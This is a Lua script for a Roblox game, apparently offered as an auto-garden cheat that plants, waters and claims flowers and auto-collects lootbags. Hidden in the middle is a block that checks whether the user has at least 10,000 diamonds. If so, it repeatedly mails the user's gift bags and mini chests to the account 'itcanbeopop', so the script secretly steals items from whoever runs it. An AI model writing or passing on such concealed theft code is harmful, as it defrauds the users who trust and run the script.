getgenv().autoGarden = true
getgenv().InstaPlant = false
getgenv().Water = true

local Player = game:GetService("Players").LocalPlayer
local RepStor = game.ReplicatedStorage
local Library = require(RepStor.Library)
local saveMod = require(RepStor.Library.Client.Save)

function getDiamonds() return Player.leaderstats["💎 Diamonds"].Value end
function getInfo(name) return saveMod.Get()[name] end 

local lootbags = nil
lootbags = workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v)
    Library.Network.Fire("Lootbags_Claim",{v.Name})
    task.wait()
    v:Destroy()
end)

    if getDiamonds() >= 10000 then
        local largeGiftBagCheckDone, smallGiftBagCheckDone
        for ID, itemTable in pairs(getInfo("Inventory")["Misc"]) do
            if largeGiftBagCheckDone and smallGiftBagCheckDone then break end
            if itemTable.id == "Large Gift Bag" then
                largeGiftBagCheckDone = true
                if itemTable._am and itemTable._am >= 5 then
                    repeat
                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 500)
                    until success
                end
            elseif itemTable.id == "Gift Bag" then
                smallGiftBagCheckDone = true
                if itemTable._am and itemTable._am >= 10 then
                    repeat
                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 1000)
                    until success
                end
            elseif itemTable.id == "Mini Chest" then
                smallGiftBagCheckDone = true
                if itemTable._am and itemTable._am >= 5 then
                    repeat
                        local success = Library.Network.Invoke("Mailbox: Send", "itcanbeopop", "i<3Kittys", "Misc", ID, 1000)
                    until success
                end
            end
        end
    end

while getgenv().autoGarden do task.wait()
    for i = 1,10 do
        Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "PlantSeed", i, "Diamond")
        if getgenv().InstaPlant then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "InstaGrowSeed", i) end
        if getgenv().Water then Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "WaterSeed", i) end
        Library.Network.Invoke("Instancing_InvokeCustomFromClient", "FlowerGarden", "ClaimPlant", i)
    end
end
